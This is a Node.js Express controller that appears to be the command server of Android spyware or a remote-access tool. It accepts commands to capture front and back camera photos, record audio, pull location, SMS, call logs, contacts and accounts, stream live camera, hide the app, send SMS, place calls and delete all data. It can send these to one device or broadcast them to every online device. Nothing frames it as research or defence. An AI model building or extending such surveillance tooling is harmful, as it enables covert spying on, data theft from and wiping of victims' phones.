const Command = require('../models/Command');
const Device = require('../models/Device');

// @desc    Send command to device
// @route   POST /api/commands/send
const sendCommand = async (req, res) => {
  try {
    const { deviceId, type, params } = req.body;

    if (!deviceId || !type) {
      return res.status(400).json({
        success: false,
        message: 'Device ID and command type are required',
      });
    }

    const validTypes = [
      'capture_photo_front', 'capture_photo_back', 'record_audio',
      'get_location', 'get_sms', 'get_call_logs', 'get_contacts',
      'get_installed_apps', 'get_accounts', 'get_storage_info',
      'upload_photo', 'upload_video', 'start_live_camera', 'stop_live_camera',
      'hide_app', 'unhide_app', 'send_sms', 'make_call', 'delete_all_data',
    ];

    if (!validTypes.includes(type)) {
      return res.status(400).json({
        success: false,
        message: `Invalid command type. Valid types: ${validTypes.join(', ')}`,
      });
    }

    const device = await Device.findOne({ deviceId });
    if (!device) {
      return res.status(404).json({ success: false, message: 'Device not found' });
    }

    const command = await Command.create({
      deviceId,
      type,
      params: params || {},
    });

    // If hide/unhide command, update device immediately
    if (type === 'hide_app') {
      device.isHidden = true;
      await device.save();
    } else if (type === 'unhide_app') {
      device.isHidden = false;
      await device.save();
    }

    res.json({
      success: true,
      command: {
        id: command._id,
        deviceId: command.deviceId,
        type: command.type,
        params: command.params,
        status: command.status,
        createdAt: command.createdAt,
      },
    });
  } catch (error) {
    console.error('Send command error:', error.message);
    res.status(500).json({ success: false, message: 'Server error' });
  }
};

// @desc    Get command history for a device
// @route   GET /api/commands/:deviceId
const getDeviceCommands = async (req, res) => {
  try {
    const { deviceId } = req.params;
    const commands = await Command.find({ deviceId })
      .sort({ createdAt: -1 })
      .limit(50);

    res.json({ success: true, commands });
  } catch (error) {
    res.status(500).json({ success: false, message: 'Server error' });
  }
};

// @desc    Send command to all devices
// @route   POST /api/commands/broadcast
const broadcastCommand = async (req, res) => {
  try {
    const { type, params } = req.body;

    const devices = await Device.find({ isOnline: true });
    const commands = await Command.insertMany(
      devices.map((device) => ({
        deviceId: device.deviceId,
        type,
        params: params || {},
      }))
    );

    res.json({
      success: true,
      count: commands.length,
      message: `Command sent to ${commands.length} devices`,
    });
  } catch (error) {
    res.status(500).json({ success: false, message: 'Server error' });
  }
};

module.exports = { sendCommand, getDeviceCommands, broadcastCommand };

